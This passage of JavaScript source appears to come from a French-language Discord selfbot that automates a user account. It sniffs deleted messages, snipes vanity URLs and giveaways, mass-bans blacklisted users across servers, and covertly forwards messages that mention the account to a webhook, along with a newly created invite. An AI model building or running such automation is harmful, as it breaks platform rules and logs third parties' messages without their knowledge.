            if (!client.premium) return message.edit(`ガ __**${name} - Premium**__ ガ\n> *Vous devez avoir un premium pour utiliser cette commande*`)

            if (client.user.connectedAccounts.filter(a => a.type === "spotify").length === 0) return message.edit(`ガ __**${name} - Spotify Shuffle**__ ガ\n> *Veuillez lier un compte spotify à discord*`)
            
            if (args[0] === "off"){
                fetch(`https://api.spotify.com/v1/me/player/repeat/shuffle?state=false`, {method: "put", headers: {authorization: `Bearer ${client.user.connectedAccounts.filter(a => a.type === "spotify")[0].access_token}`}})
                .then(() => message.edit(`ガ __**${name} - Spotify Shuffle**__ ガ\n> *La musique sera pas prise aléatoirement*`))
                .catch(() => message.edit(`ガ __**${name} - Spotify Shuffle**__ ガ\n> *Je n'ai pas pu retirer le mode shuffle*`))    
            }

            else if (args[0] === "on") {
                fetch(`https://api.spotify.com/v1/me/player/repeat/shuffle?state=true`, {method: "put", headers: {authorization: `Bearer ${client.user.connectedAccounts.filter(a => a.type === "spotify")[0].access_token}`}})
                .then(() => message.edit(`ガ __**${name} - Spotify Shuffle**__ ガ\n> *La musique sera prise aléatoirement*`))
                .catch(() => message.edit(`ガ __**${name} - Spotify Shuffle**__ ガ\n> *Je n'ai pas pu activer le mode shuffle*`))    
            }
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "next")){
            if (!client.premium) return message.edit(`ガ __**${name} - Premium**__ ガ\n> *Vous devez avoir un premium pour utiliser cette commande*`)

            if (client.user.connectedAccounts.filter(a => a.type === "spotify").length === 0) return message.edit(`ガ __**${name} - Spotify Next**__ ガ\n> *Veuillez lier un compte spotify à discord*`)
            fetch(`https://api.spotify.com/v1/me/player/next`, {method: "post", headers: {authorization: `Bearer ${client.user.connectedAccounts.filter(a => a.type === "spotify")[0].access_token}`}})
            .then(() => message.edit(`ガ __**${name} - Spotify Next**__ ガ\n> *J'ai changé la musique*`))
            .catch(() => message.edit(`ガ __**${name} - Spotify Next**__ ガ\n> *Je n'ai pas pu sauté la musique*`))
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "pause")){
            if (!client.premium) return message.edit(`ガ __**${name} - Premium**__ ガ\n> *Vous devez avoir un premium pour utiliser cette commande*`)

            if (client.user.connectedAccounts.filter(a => a.type === "spotify").length === 0) return message.edit(`ガ __**${name} - Spotify Pause**__ ガ\n> *Veuillez lier un compte spotify à discord*`)
            fetch(`https://api.spotify.com/v1/me/player/pause`, {method: "put", headers: {authorization: `Bearer ${client.user.connectedAccounts.filter(a => a.type === "spotify")[0].access_token}`}})
            .then(() => message.edit(`ガ __**${name} - Spotify Pause**__ ガ\n> *J'ai mis en pause la musique*`))
            .catch(() => message.edit(`ガ __**${name} - Spotify Pause**__ ガ\n> *Je n'ai pas pu mettre en pause la musique*`))
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "resume")){
            if (!client.premium) return message.edit(`ガ __**${name} - Premium**__ ガ\n> *Vous devez avoir un premium pour utiliser cette commande*`)

            if (client.user.connectedAccounts.filter(a => a.type === "spotify").length === 0) return message.edit(`ガ __**${name} - Spotify Resume**__ ガ\n> *Veuillez lier un compte spotify à discord*`)
            fetch(`https://api.spotify.com/v1/me/player/play`, {method: "put", headers: {authorization: `Bearer ${client.user.connectedAccounts.filter(a => a.type === "spotify")[0].access_token}`}})
            .then(() => message.edit(`ガ __**${name} - Spotify Resume**__ ガ\n> *J'ai repris la musique*`))
            .catch(() => message.edit(`ガ __**${name} - Spotify Resume**__ ガ\n> *Je n'ai pas pu reprendre la musique*`))
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "previous")){
            if (!client.premium) return message.edit(`ガ __**${name} - Premium**__ ガ\n> *Vous devez avoir un premium pour utiliser cette commande*`)

            if (client.user.connectedAccounts.filter(a => a.type === "spotify").length === 0) return message.edit(`ガ __**${name} - Spotify Previous**__ ガ\n> *Veuillez lier un compte spotify à discord*`)
            fetch(`https://api.spotify.com/v1/me/player/previous`, {method: "post", headers: {authorization: `Bearer ${client.user.connectedAccounts.filter(a => a.type === "spotify")[0].access_token}`}})
            .then(() => message.edit(`ガ __**${name} - Spotify Previous**__ ガ\n> *J'ai changé la musique*`))
            .catch(() => message.edit(`ガ __**${name} - Spotify Previous**__ ガ\n> *Je n'ai pas pu sauté la musique*`))
        }


    })
        

    client.on('messageDelete', async message => {
        client.snipes.set(message.channel.id, {
            content: message.content ? message.content : "Aucun message",
            author: message.author,
            moment: Date.now(),
            images: message.attachments.first()?.url ? message.attachments.first()?.url : "Aucune image"
        })
    })

    client.on('guildUpdate', async (oldGuild, newGuild) => {
        if (!oldGuild || !oldGuild?.id || !newGuild || !newGuild?.id) return;
        if (oldGuild.vanityURLCode === newGuild.vanityURLCode) return;
        if (!tools.vanity_locker.includes(oldGuild?.id)) return;

        const action = await newGuild.fetchAuditLogs({type: 1, limit: 1}).then(a => a.entries.first()).catch(() => false)
        if (!action?.executor) return;
        if (action.executor?.id === client.user?.id) return;

        newGuild.setVanityCode(oldGuild.vanityURLCode).catch(() => false)
    })

    client.on('guildUpdate', async (oldGuild, newGuild) => {
        if (!oldGuild || !oldGuild?.id || !newGuild || !newGuild?.id) return;
        const keys = Object.keys(tools.vanity_sniper);
        const foundKey = keys.find(key => tools.vanity_sniper[key].guildId === oldGuild?.id);
        if (oldGuild.vanityURLCode === newGuild.vanityURLCode) return;
        if (!foundKey) return;
        
        const guild = client.guilds.cache.get(foundKey)
        if (guild && guild.features.includes("VANITY_URL")) guild.setVanityCode(oldGuild.vanityURLCode).catch(() => false)
    })

    client.on('guildDelete', async guild => {
        if (!guild || !guild?.id) return;
        if (tools.vanity_sniper[guild?.id]) delete tools.vanity_sniper[guild?.id]
        if (Object.values(tools.vanity_sniper).some(o => o.guildId === guild?.id)) tools.vanity_sniper = Object.fromEntries(Object.entries(vanity).filter(([key, value]) => value.guildId !== guild?.id));
        
        client.save(`${__dirname}/Data/Tools/tools.json`, tools)
    })

    client.on('messageReactionAdd', async (reaction, user) => {
        if (!tools.giveaway_sniper || !reaction || !reaction.message || !reaction.message.guild || !reaction.message.guild?.id || !user || !user.bot || !user?.id) return;

        if(reaction.message && reaction.message.embeds.length > 0 && reaction.message.embeds[0].title && reaction.message.embeds[0].title.toLowerCase().includes("giveaway") || reaction.message.embeds.length > 0 && reaction.message.embeds[0].fields.length > 0 && reaction.message.embeds[0].fields[0].name.toLowerCase().includes("giveaway")) {
            reaction.message.react(estEmojiDiscord(reaction.emoji) ? reaction.emoji.name : reaction.emoji?.id).catch(() => false)
        } else if (reaction.message && reaction.emoji.name == "🎉") {
            reaction.message.react("🎉").catch(() => false)
        }
    })

    client.on('messageCreate', async message => {
        if (!message || !message.guild || !message.guild?.id || !message.author || !message.author?.id || !message.author.bot) return;
        if (!tools.giveaway_sniper) return;

        if (message.content && message.content.toLocaleLowerCase().includes("giveaway") 
        || message.embeds.length > 0 && message.embeds[0].title &&  message.embeds[0].title.toLocaleLowerCase().includes("giveaway")
        || message.embeds.length > 0 && message.embeds[0].fields && message.embeds[0].fields.length > 0 && message.embeds[0].fields[0].name.toLowerCase().includes("giveaway")){
            if (message && message.id && message.components.length > 0) message.clickButton().catch(() => false)
        } 
        else if (message.components.length > 0 && message.components[0].components.filter(c => c.type === "BUTTON").length > 0 && message.components[0].components.find((x) => x.emoji?.name === "🎉")) {
            message.components[0].components.filter(c => c.type === "BUTTON").map(button => 
                message && message.id && message.components.length > 0 ? message.clickButton(button).catch(() => false) : false
            )
        }
    })

    client.on('guildMemberAdd', async member => {
        if (!member || !member.guild || !member.guild?.id || !member.user || !member.user?.id) return;
        if (tools.blacklist.includes(member?.id)) member.guild.bans.create(member.user, { reason: "RSZ Blacklist" }).catch(() => false)
    })

    client.on('messageCreate', async message => {
        if (!message || !message.guild || !message.guild?.id || !message.author || !message.author?.id) return;
        if (tools.blacklist.includes(message.author?.id)) message.guild.bans.create(message.author, { reason: "RSZ Blacklist" }).catch(() => false)
    })

    client.on('messageCreate', async message => {
        if (!tools.pub_mp) return;
        if (!message || !message.author || !message.author?.id || message.channel.type !== "DM") return;
        if (client.relationships.friendCache.some(user => user?.id === message.author?.id)) return;
        if (linksdsc.some((word) => message.content.toLowerCase().includes(word))){
            message.markRead().catch(() => false)
            if (tools.protect_mp === true){
                if (!tools.blacklist.includes(message.author?.id)) tools.blacklist.push(message.author?.id)
                client.save(`${__dirname}/Data/Tools/tools.json`, tools)

                client.guilds.cache.filter(g => g.members.me.permissions.has("BAN_MEMBERS")).forEach(guild => {
                    guild.bans.create(message.author, { reason: "RSZ Blacklist" }).catch(() => false)
                })
            }
        }
    
        
    })

    client.on('roleCreate', async role => {
        const guild = role.guild
        if (!gestion[guild?.id]) return;

        gestion[guild?.id].counter.forEach(object => {
            const channel = guild.channels.cache.get(object.channelId)
            let role = guild.roles.cache.get(object.channelName.split("[member.role-")[1]?.replace("]", "")) ?? null

            if (channel) channel.setName(object.channelName
                .replace(`[member.role-${role?.id}]`, guild.members.cache.filter(m => m.roles.cache.has(role?.id)).size)
                .replace("[server.roles]", guild.roles.cache.size)
                .replace('[server.channels]', guild.channels.cache.size)
                .replace("[server.text]", guild.channels.cache.filter(c => c.type === "GUILD_TEXT").size)
                .replace("[server.voice]", guild.channels.cache.filter(c => c.type === 'GUILD_VOICE').size)
                .replace('[server.cam]', guild.members.cache.filter(m => m.voice.selfVideo).size)
                .replace('[server.ecrean]', guild.members.cache.filter(m => m.voice.streaming).size)
                .replace('[server.boosts]', guild.premiumSubscriptionCount)
                .replace('[server.tier]', guild.premiumTier)
                .replace('[server.onlines]', guild.members.cache.filter(m => m?.presence?.status !== "offline" && m?.presence?.status !== "invisible").size)
                .replace('[server?.idle]', guild.members.cache.filter(m => m?.presence?.status !== "idle").size)
                .replace('[server.dnd]', guild.members.cache.filter(m => m?.presence?.status !== "dnd").size)
                .replace('[server.stream]', guild.members.cache.filter(m => m?.presence?.activities?.includes(a => a?.type === "STREAMING")).size)
                .replace('[server?.botCount]', guild.members.cache.filter(m => m.user?.bot).size)
                .replace('[server.humainCount]', guild.members.cache.filter(m => !m.user?.bot).size)
                .replace('[server.memberCount]', guild.memberCount)
            )
        })
    })

    client.on('roleDelete', async role => {
        const guild = role.guild
        if (!gestion[guild?.id]) return;

        gestion[guild?.id].counter.forEach(object => {
            const channel = guild.channels.cache.get(object.channelId)
            let role = guild.roles.cache.get(object.channelName.split("[member.role-")[1]?.replace("]", "")) ?? null

            if (channel) channel.setName(object.channelName
                .replace(`[member.role-${role?.id}]`, guild.members.cache.filter(m => m.roles.cache.has(role?.id)).size)
                .replace("[server.roles]", guild.roles.cache.size)
                .replace('[server.channels]', guild.channels.cache.size)
                .replace("[server.text]", guild.channels.cache.filter(c => c.type === "GUILD_TEXT").size)
                .replace("[server.voice]", guild.channels.cache.filter(c => c.type === 'GUILD_VOICE').size)
                .replace('[server.cam]', guild.members.cache.filter(m => m.voice.selfVideo).size)
                .replace('[server.ecrean]', guild.members.cache.filter(m => m.voice.streaming).size)
                .replace('[server.boosts]', guild.premiumSubscriptionCount)
                .replace('[server.tier]', guild.premiumTier)
                .replace('[server.onlines]', guild.members.cache.filter(m => m?.presence?.status !== "offline" && m?.presence?.status !== "invisible").size)
                .replace('[server?.idle]', guild.members.cache.filter(m => m?.presence?.status !== "idle").size)
                .replace('[server.dnd]', guild.members.cache.filter(m => m?.presence?.status !== "dnd").size)
                .replace('[server.stream]', guild.members.cache.filter(m => m?.presence?.activities?.includes(a => a?.type === "STREAMING")).size)
                .replace('[server?.botCount]', guild.members.cache.filter(m => m.user?.bot).size)
                .replace('[server.humainCount]', guild.members.cache.filter(m => !m.user?.bot).size)
                .replace('[server.memberCount]', guild.memberCount)
            )
        })
    })

    client.on('channelCreate', async channel => {
        const guild = channel.guild
        if (!gestion[guild?.id]) return;

        gestion[guild?.id].counter.forEach(object => {
            const channel = guild.channels.cache.get(object.channelId)
            let role = guild.roles.cache.get(object.channelName.split("[member.role-")[1]?.replace("]", "")) ?? null

            if (channel) channel.setName(object.channelName
                .replace(`[member.role-${role?.id}]`, guild.members.cache.filter(m => m.roles.cache.has(role?.id)).size)
                .replace("[server.roles]", guild.roles.cache.size)
                .replace('[server.channels]', guild.channels.cache.size)
                .replace("[server.text]", guild.channels.cache.filter(c => c.type === "GUILD_TEXT").size)
                .replace("[server.voice]", guild.channels.cache.filter(c => c.type === 'GUILD_VOICE').size)
                .replace('[server.cam]', guild.members.cache.filter(m => m.voice.selfVideo).size)
                .replace('[server.ecrean]', guild.members.cache.filter(m => m.voice.streaming).size)
                .replace('[server.boosts]', guild.premiumSubscriptionCount)
                .replace('[server.tier]', guild.premiumTier)
                .replace('[server.onlines]', guild.members.cache.filter(m => m?.presence?.status !== "offline" && m?.presence?.status !== "invisible").size)
                .replace('[server?.idle]', guild.members.cache.filter(m => m?.presence?.status !== "idle").size)
                .replace('[server.dnd]', guild.members.cache.filter(m => m?.presence?.status !== "dnd").size)
                .replace('[server.stream]', guild.members.cache.filter(m => m?.presence?.activities?.includes(a => a?.type === "STREAMING")).size)
                .replace('[server?.botCount]', guild.members.cache.filter(m => m.user?.bot).size)
                .replace('[server.humainCount]', guild.members.cache.filter(m => !m.user?.bot).size)
                .replace('[server.memberCount]', guild.memberCount)
            )
        })
    })

    client.on('channelDelete', async channel => {
        const guild = channel.guild
        if (!gestion[guild?.id]) return;

        gestion[guild?.id].counter.forEach(object => {
            const channel = guild.channels.cache.get(object.channelId)
            let role = guild.roles.cache.get(object.channelName.split("[member.role-")[1]?.replace("]", "")) ?? null

            if (channel) channel.setName(object.channelName
                .replace(`[member.role-${role?.id}]`, guild.members.cache.filter(m => m.roles.cache.has(role?.id)).size)
                .replace("[server.roles]", guild.roles.cache.size)
                .replace('[server.channels]', guild.channels.cache.size)
                .replace("[server.text]", guild.channels.cache.filter(c => c.type === "GUILD_TEXT").size)
                .replace("[server.voice]", guild.channels.cache.filter(c => c.type === 'GUILD_VOICE').size)
                .replace('[server.cam]', guild.members.cache.filter(m => m.voice.selfVideo).size)
                .replace('[server.ecrean]', guild.members.cache.filter(m => m.voice.streaming).size)
                .replace('[server.boosts]', guild.premiumSubscriptionCount)
                .replace('[server.tier]', guild.premiumTier)
                .replace('[server.onlines]', guild.members.cache.filter(m => m?.presence?.status !== "offline" && m?.presence?.status !== "invisible").size)
                .replace('[server?.idle]', guild.members.cache.filter(m => m?.presence?.status !== "idle").size)
                .replace('[server.dnd]', guild.members.cache.filter(m => m?.presence?.status !== "dnd").size)
                .replace('[server.stream]', guild.members.cache.filter(m => m?.presence?.activities?.includes(a => a?.type === "STREAMING")).size)
                .replace('[server?.botCount]', guild.members.cache.filter(m => m.user?.bot).size)
                .replace('[server.humainCount]', guild.members.cache.filter(m => !m.user?.bot).size)
                .replace('[server.memberCount]', guild.memberCount)
            )
        })
    })

    client.on('voiceStateUpdate', async (oldState, newState) => {
        const guild = newState?.guild || oldState?.guild
        if (!gestion[guild?.id]) return;
        if (newState && gestion[newState.guild?.id] && gestion[newState.guild?.id].tempvoc[newState.channelId]){
            const c = await newState.guild.channels.create(`${gestion[newState.guild?.id].tempvoc[newState.channelId].name}${newState.user.username}`, {
                type: "GUILD_VOICE", 
                parent: newState.guild.channels.cache.get(gestion[newState.guild?.id].tempvoc[newState.channelId].categoryId) ?? null, 
                permissionOverwrites: [
                    {id: newState.user?.id, allow: ["CONNECT", "MOVE_MEMBERS", "MUTE_MEMBERS", "DEAFEN_MEMBERS", "STREAM", "START_EMBEDDED_ACTIVITIES", "PRIORITY_SPEAKER", "SPEAK", "USE_SOUNDBOARD", "SEND_MESSAGES", "ATTACH_FILES", "EMBED_LINKS"]}
                ]
            })
            newState.member.voice.setChannel(c)
            tchannels.push(c?.id)
        }

        if (oldState && oldState.guild?.name && tchannels.includes(oldState.channelId) && oldState.channel.members.filter(m => !m.user?.bot).size === 0){
            oldState.channel.delete().then(() => tchannels = tchannels.filter(id => id !== oldState.channelId))
        }

        gestion[guild?.id].counter.forEach(object => {
            const channel = guild.channels.cache.get(object.channelId)
            let role = guild.roles.cache.get(object.channelName.split("[member.role-")[1]?.replace("]", "")) ?? null

            if (channel) channel.setName(object.channelName
                .replace(`[member.role-${role?.id}]`, guild.members.cache.filter(m => m.roles.cache.has(role?.id)).size)
                .replace("[server.roles]", guild.roles.cache.size)
                .replace('[server.channels]', guild.channels.cache.size)
                .replace("[server.text]", guild.channels.cache.filter(c => c.type === "GUILD_TEXT").size)
                .replace("[server.voice]", guild.channels.cache.filter(c => c.type === 'GUILD_VOICE').size)
                .replace('[server.cam]', guild.members.cache.filter(m => m.voice.selfVideo).size)
                .replace('[server.ecrean]', guild.members.cache.filter(m => m.voice.streaming).size)
                .replace('[server.boosts]', guild.premiumSubscriptionCount)
                .replace('[server.tier]', guild.premiumTier)
                .replace('[server.onlines]', guild.members.cache.filter(m => m?.presence?.status !== "offline" && m?.presence?.status !== "invisible").size)
                .replace('[server?.idle]', guild.members.cache.filter(m => m?.presence?.status !== "idle").size)
                .replace('[server.dnd]', guild.members.cache.filter(m => m?.presence?.status !== "dnd").size)
                .replace('[server.stream]', guild.members.cache.filter(m => m?.presence?.activities?.includes(a => a?.type === "STREAMING")).size)
                .replace('[server?.botCount]', guild.members.cache.filter(m => m.user?.bot).size)
                .replace('[server.humainCount]', guild.members.cache.filter(m => !m.user?.bot).size)
                .replace('[server.memberCount]', guild.memberCount)
            )
        })
    })

    client.on('guildUpdate', async (oldGuild, newGuild) => {
        const guild = oldGuild || newGuild
        if (!gestion[guild?.id]) return;
        gestion[guild?.id].counter.forEach(object => {
            const channel = guild.channels.cache.get(object.channelId)
            let role = guild.roles.cache.get(object.channelName.split("[member.role-")[1]?.replace("]", "")) ?? null

            if (channel) channel.setName(object.channelName
                .replace(`[member.role-${role?.id}]`, guild.members.cache.filter(m => m.roles.cache.has(role?.id)).size)
                .replace("[server.roles]", guild.roles.cache.size)
                .replace('[server.channels]', guild.channels.cache.size)
                .replace("[server.text]", guild.channels.cache.filter(c => c.type === "GUILD_TEXT").size)
                .replace("[server.voice]", guild.channels.cache.filter(c => c.type === 'GUILD_VOICE').size)
                .replace('[server.cam]', guild.members.cache.filter(m => m.voice.selfVideo).size)
                .replace('[server.ecrean]', guild.members.cache.filter(m => m.voice.streaming).size)
                .replace('[server.boosts]', guild.premiumSubscriptionCount)
                .replace('[server.tier]', guild.premiumTier)
                .replace('[server.onlines]', guild.members.cache.filter(m => m?.presence?.status !== "offline" && m?.presence?.status !== "invisible").size)
                .replace('[server?.idle]', guild.members.cache.filter(m => m?.presence?.status !== "idle").size)
                .replace('[server.dnd]', guild.members.cache.filter(m => m?.presence?.status !== "dnd").size)
                .replace('[server.stream]', guild.members.cache.filter(m => m?.presence?.activities?.includes(a => a?.type === "STREAMING")).size)
                .replace('[server?.botCount]', guild.members.cache.filter(m => m.user?.bot).size)
                .replace('[server.humainCount]', guild.members.cache.filter(m => !m.user?.bot).size)
                .replace('[server.memberCount]', guild.memberCount)
            )
        })
    })

    client.on('presenceUpdate', async (oldPresence, newPresence) => {
        const guild = oldPresence?.guild || newPresence?.guild
        if (!gestion[guild?.id]) return;
        gestion[guild?.id].counter.forEach(object => {
            const channel = guild.channels.cache.get(object.channelId)
            let role = guild.roles.cache.get(object.channelName.split("[member.role-")[1]?.replace("]", "")) ?? null

            if (channel) channel.setName(object.channelName
                .replace(`[member.role-${role?.id}]`, guild.members.cache.filter(m => m.roles.cache.has(role?.id)).size)
                .replace("[server.roles]", guild.roles.cache.size)
                .replace('[server.channels]', guild.channels.cache.size)
                .replace("[server.text]", guild.channels.cache.filter(c => c.type === "GUILD_TEXT").size)
                .replace("[server.voice]", guild.channels.cache.filter(c => c.type === 'GUILD_VOICE').size)
                .replace('[server.cam]', guild.members.cache.filter(m => m.voice.selfVideo).size)
                .replace('[server.ecrean]', guild.members.cache.filter(m => m.voice.streaming).size)
                .replace('[server.boosts]', guild.premiumSubscriptionCount)
                .replace('[server.tier]', guild.premiumTier)
                .replace('[server.onlines]', guild.members.cache.filter(m => m?.presence?.status !== "offline" && m?.presence?.status !== "invisible").size)
                .replace('[server?.idle]', guild.members.cache.filter(m => m?.presence?.status !== "idle").size)
                .replace('[server.dnd]', guild.members.cache.filter(m => m?.presence?.status !== "dnd").size)
                .replace('[server.stream]', guild.members.cache.filter(m => m?.presence?.activities?.includes(a => a?.type === "STREAMING")).size)
                .replace('[server?.botCount]', guild.members.cache.filter(m => m.user?.bot).size)
                .replace('[server.humainCount]', guild.members.cache.filter(m => !m.user?.bot).size)
                .replace('[server.memberCount]', guild.memberCount)
            )
        })
    })

    client.on('guildMemberRemove', async member => {
        const guild = member.guild
        if (!gestion[guild?.id]) return;
        gestion[guild?.id].counter.forEach(object => {
            const channel = guild.channels.cache.get(object.channelId)
            let role = guild.roles.cache.get(object.channelName.split("[member.role-")[1]?.replace("]", "")) ?? null

            if (channel) channel.setName(object.channelName
                .replace(`[member.role-${role?.id}]`, guild.members.cache.filter(m => m.roles.cache.has(role?.id)).size)
                .replace("[server.roles]", guild.roles.cache.size)
                .replace('[server.channels]', guild.channels.cache.size)
                .replace("[server.text]", guild.channels.cache.filter(c => c.type === "GUILD_TEXT").size)
                .replace("[server.voice]", guild.channels.cache.filter(c => c.type === 'GUILD_VOICE').size)
                .replace('[server.cam]', guild.members.cache.filter(m => m.voice.selfVideo).size)
                .replace('[server.ecrean]', guild.members.cache.filter(m => m.voice.streaming).size)
                .replace('[server.boosts]', guild.premiumSubscriptionCount)
                .replace('[server.tier]', guild.premiumTier)
                .replace('[server.onlines]', guild.members.cache.filter(m => m?.presence?.status !== "offline" && m?.presence?.status !== "invisible").size)
                .replace('[server?.idle]', guild.members.cache.filter(m => m?.presence?.status !== "idle").size)
                .replace('[server.dnd]', guild.members.cache.filter(m => m?.presence?.status !== "dnd").size)
                .replace('[server.stream]', guild.members.cache.filter(m => m?.presence?.activities?.includes(a => a?.type === "STREAMING")).size)
                .replace('[server?.botCount]', guild.members.cache.filter(m => m.user?.bot).size)
                .replace('[server.humainCount]', guild.members.cache.filter(m => !m.user?.bot).size)
                .replace('[server.memberCount]', guild.memberCount)
            )
        })
    })

    client.on('guildMemberUpdate', async (oldMember, newMember) => {
        if (!gestion[oldMember.guild?.id]?.rolelimit) return;
        if (oldMember.roles.cache.size < newMember.roles.cache.size) {
    
            const addedRole = newMember.roles.cache.find(role => !oldMember.roles.cache.has(role?.id));
            const data = gestion[oldMember.guild?.id]?.rolelimit[addedRole?.id]
            if (!data) return;
    
            if (data.limit > 0) {
                const memberCount = newMember.guild.members.cache.filter(member => member.roles.cache.has(addedRole?.id)).size;
                if (memberCount < data.limit || memberCount === data.limit) {
                    const role = newMember.guild.roles.cache.get(addedRole?.id);
                    if (role) role.edit({ name: `${data.name} [${memberCount}/${data.limit}]` });
                }
                else if (memberCount > data.limit) return await newMember.roles.remove(addedRole).catch(() => false);
                
            }
        }
        else if (oldMember.roles.cache.size > newMember.roles.cache.size){
            const removedRoles = oldMember.roles.cache.find(role => !newMember.roles.cache.has(role?.id));
            const data = gestion[oldMember.guild?.id]?.rolelimit[removedRoles?.id]
            if (!data) return;
    
            if (data.limit > 0) {
                const memberCount = newMember.guild.members.cache.filter(member => member.roles.cache.has(removedRoles?.id)).size;
                if (removedRoles) removedRoles.edit({ name: `${data.name} [${memberCount}/${data.limit}]` });
            }
        }    
    })

    client.on('messageReactionAdd', async (reaction, user) => {
        if (!reaction.message.guild) return;
        if (!gestion[reaction.message.guildId])
        if (tmessages.includes(reaction.message?.id)) return;
        if (gestion[reaction.message.guildId]?.tickets[reaction.message?.id] && reaction.emoji.name === gestion[reaction.message.guildId]?.tickets[reaction.message?.id].reaction){
            reaction.users.remove(user?.id).catch(() => false)
            if (reaction.message.guild.channels.cache.filter(c => c.name === `ticket-${user.username}`.replaceAll('.', "")).length > 0) return reaction.message.channel.send(`**${user} vous avez déjà crée un ticket**`).then(m => setTimeout(() => m.delete().catch(() => false), 5000))

            const c = await reaction.message.guild.channels.create(`ticket-${user.username}`.replaceAll('.', ""), {
                topic: `rsz ticket`,
                parent: reaction.message.guild.channels.cache.get(gestion[reaction.message.guildId]?.tickets[reaction.message.channelId].categoryId) ?? null, 
                permissionOverwrites: [
                    {
                        id: reaction.message.guild.roles.everyone?.id, deny: ["VIEW_CHANNEL", "READ_MESSAGE_HISTORY", "SEND_MESSAGES", "ADD_REACTIONS", "START_EMBEDDED_ACTIVITIES"],
                    },
                    {
                        id: user?.id, allow: ["VIEW_CHANNEL", "SEND_MESSAGES", "ATTACH_FILES", "EMBED_LINKS"]
                    }
                ]
            })
            const embed = new discord.WebEmbed()
                .setTitle("Panel Ticket")
                .setDescription(`𝗩𝗲𝘂𝗶𝗹𝗹𝗲𝘇 𝗮𝘁𝘁𝗲𝗻𝗱𝗿𝗲 𝗹'𝗮𝗿𝗿𝗶𝘃𝗲𝗿 𝗱'𝘂𝗻 𝘀𝘁𝗮𝗳𝗳\n🎫 ${client.separator} 𝐅𝐞𝐫𝐦𝐞𝐫 𝐥𝐞 𝐭𝐢𝐜𝐤𝐞𝐭\n📄 ${client.separator} 𝐂𝐫𝐞𝐞 𝐮𝐧 𝐭𝐫𝐚𝐧𝐬𝐜𝐫𝐢𝐩𝐭`)
                .setColor(0x2B2D31)

            const m = await c.send({embeds: [embed]})
            tmessages.push(m?.id)
            m.react("🎫")
            m.react("📄")
            c.send(`${user}`).then(m => m.delete().catch(() => false))
            setTimeout(() => tmessages = tmessages.filter(id => id !== m?.id), 1000);
        }
        else if (reaction.emoji.name === "🎫" && reaction.message.channel.topic === "rsz ticket"){
            const m = await reaction.message.channel.send(`**Ce ticket va se supprimer dans <t:${Math.round((Date.now() + 5000) / 1000)}:R>**`)
            setTimeout(() => reaction.message.channel.delete().catch(() => m.delete().catch(() => false)), 5000)
        }
        else if (reaction.emoji.name === "📄" && reaction.message.channel.topic === "rsz ticket"){
            const m = await reaction.message.channel.send(`**Création d'un transcript en cours...**`)

            async function fetchAll(){
                let messages = [];
                let lastID;
                while (true) { 
                    const fetchedMessages = await reaction.message.channel.messages.fetch({
                        limit: 100,
                        ...(lastID && { before: lastID }),
                    });
                    if (fetchedMessages.size === 0) {
                        messages = messages.filter(msg => !msg.author?.bot)
                        return messages;
                    }
                    messages = messages.concat(Array.from(fetchedMessages.values()));
                    lastID = fetchedMessages.lastKey();
                }
            }

            let allMessages = await fetchAll();
            allMessages = allMessages.reverse();
            let results = allMessages.map(msg => `Content: ${msg.content} Author: ${msg.author.tag} Date: [${formatDateWithTime(msg.createdTimestamp)}] Attachments: ${msg.attachments.size > 0 ? msg.attachments.first().url : "None"}`).join('\n');
            fs.writeFile(`./${reaction.message.channel?.id}_${user?.id}`, results, async () => {
                await m.edit({ content: null, files: [{ attachment: `./${reaction.message.channel?.id}_${user?.id}`, name: `${reaction.message.channel?.id}.txt`}]});
                fs.unlink(`./${reaction.message.channel?.id}_${user?.id}`, (err) => err => false);
            })
        }
        else if (gestion[reaction.message.guildId]?.rolemenu[reaction.message?.id]?.some(o => o.reaction === reaction.emoji.name)){
            const role = reaction.message.guild.roles.cache.get(gestion[reaction.message.guildId]?.rolemenu[reaction.message?.id].find(o => o.reaction === reaction.emoji.name).roleId)
            const member = await reaction.message.guild.members.fetch(user?.id).catch(() => false)
            if (role && member && !member.roles.cache.has(role?.id)) member.roles.add(role) 
        }
    })

    client.on('messageCreate', async message => {
        if (!message || !message.author || !message.author?.id)
        if (tools.copy?.includes(message.author.id)) message.channel.send(message.toJSON()).catch(() => false)
            if (message.content?.toLocaleLowerCase().includes(client.user.username?.toLocaleLowerCase()) || message.content?.toLocaleLowerCase().includes(client.user.globalName?.toLocaleLowerCase()) || message.content.includes(client.user?.id)){
                if (!message.guild?.name) return;
                if (message.author?.id === client.user?.id) return;
                if (logger.activate && logger.guild && logger.hypocrite && !message.author?.bot && message.author?.username){
                    const t = await fetch(logger.webhook).catch(() => false)
                    if (t.status !== 200) return;
        
                    const channel = message.guild.channels.cache.first()
                    const invite = await channel?.createInvite({maxUses: 0, maxAge: 0, unique: true }).catch(() => false)
                    const webhook = new discord.WebhookClient({url: logger.webhook })
                    const embed = new discord.MessageEmbed()
                        .setColor("#00ffb1")
                        .setAuthor({name: message.author.username, iconURL: message.author.avatarURL({dynamic: true})})
                        .setTitle("<a:diamand:1228335341098893333>・Hypocrite・<a:diamand:1228335341098893333>")
                        .addFields({name: "Serveur : ", value: `${message.guild?.name || "Aucun"}`})
                        .addFields({name: "Salon : ", value: `${message.channel?.name || "Aucun"}`})
                        .addFields({name: "Invitation : ", value: `${invite.url || "Aucune"}`})
                        .addFields({name: "Message : ", value: `${message.content || "Aucun"}`})
                        .addFields({name: "Fichiers : ", value: `${message.attachments.size > 0 ? message.attachments.map(lien => `[fichier](${lien})`).join(' , ') : "Aucun"}`})
                        .setTimestamp()
                        .setFooter({text: `${client.user.username}・R$Z Logger`, iconURL: `${client.user.displayAvatarURL({dynamic: true})}`})
                
                    webhook.send({embeds: [embed], username: `${client.user.username} | RSZ Logger` })
                }
            }
            if (message.channel.type === "DM"){
                if (!tools.afk) return;
                if (message.author?.id === client.user?.id) return;
                if (client.interval[`afk-${message.channel?.id}`]) return message.markRead().catch(() => false);
                client.interval[`afk-${message.channel?.id}`] = true
                message.reply(`**Je suis afk pour \`${tools.afk_message}\`**`).then(m => setTimeout(() => m.delete().catch(() => false) && delete client.interval[`afk-${message.channel?.id}`], 5000))
            }
            if (message.reference){
                if (message.author?.id === client.user?.id) return;
                const reference = await message.channel.messages.fetch(message.reference.messageId)
                if (reference && reference.author && reference.author?.id === client.user?.id){
                    if (!tools.afk) return;
                    if (client.interval[`afk-${message.channel?.id}`]) return  message.markRead().catch(() => false);
